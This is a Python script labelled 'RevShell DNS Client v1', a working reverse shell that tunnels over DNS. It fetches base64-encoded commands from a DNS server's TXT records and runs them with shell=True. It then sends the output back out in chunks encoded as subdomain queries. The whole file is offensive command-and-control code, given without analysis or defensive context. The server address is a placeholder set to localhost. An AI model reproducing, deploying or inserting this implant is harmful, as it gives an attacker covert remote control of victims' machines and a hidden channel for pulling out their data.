#!/usr/bin/env python
#RevShell DNS Client v1

import os
import subprocess
import dns.resolver
import textwrap, base64
 
HOST = '127.0.0.1'
PORT = 53
TLD = 'com'
NXT_CMD = 'nxt'
ANSWER = ';ANSWER'
TYPE = 'TXT'
# Default connection reset string, b64 encoded:
nextCommand = base64.b64encode(NXT_CMD)

def formURL(cmd):
  return '{}.{}'.format(cmd, TLD)

def startConnection():
  ## Query fake dns server for commands to run:
  url = formURL(nextCommand)
  request = dns.message.make_query(url, dns.rdatatype.TXT)
  answers = dns.query.udp(request, HOST)
  a = answers.to_text()
  return a

def parseCmd(a):
  cmd = ''
  answer = 0
  for line in a.split("\n"):
    if answer == 1:
      cmd = textwrap.dedent(line.split(TYPE)[-1]).strip('"')
      answer = 0
    if ANSWER in line: answer = 1
  return cmd

def encodeB64Equals(output):
  # Remove "=", add "-" to denote we need "="
  if output[-1] == "=": 
    if output[-2] == "=":
      output = output[0]+"-"+output[1]+"-"+output[2:-2]
    else:
      output = output[0]+"-"+output[1:-1]
  return output

def runCmd(cmd):
  # Parse command from response
  nxtCmd = base64.b64decode(cmd)
  # Check for server quit command
  if nxtCmd == "quit": exit(0)
  # Execute server command
  proc = subprocess.Popen(nxtCmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  stdoutput = proc.stdout.read() + proc.stderr.read()
  # Encode output data, ready for loop
  output = base64.b64encode(stdoutput)
  output = encodeB64Equals(output)

  return output

def dnsMakeQuery(url):
  feedback_request = dns.message.make_query(url, dns.rdatatype.A)
  dns.query.udp(feedback_request, HOST)

def sendOutputToServer(output):
  send =''
  output_end = len(output)
  for chunk in output:
    send += chunk
    output_end -= 1
    # Send 58 charcter chunks:
    if len(send) == 58:
      url = formURL(send)
      dnsMakeQuery(url)
      send =''
    # Send out final chunk:
    if output_end == 0:
      url = formURL(send)
      dnsMakeQuery(url)

def main():
  while 1:
    a = startConnection()
    cmd = parseCmd(a)
    stdoutput = runCmd(cmd)
    sendOutputToServer(stdoutput)

if __name__ == '__main__':
  main()
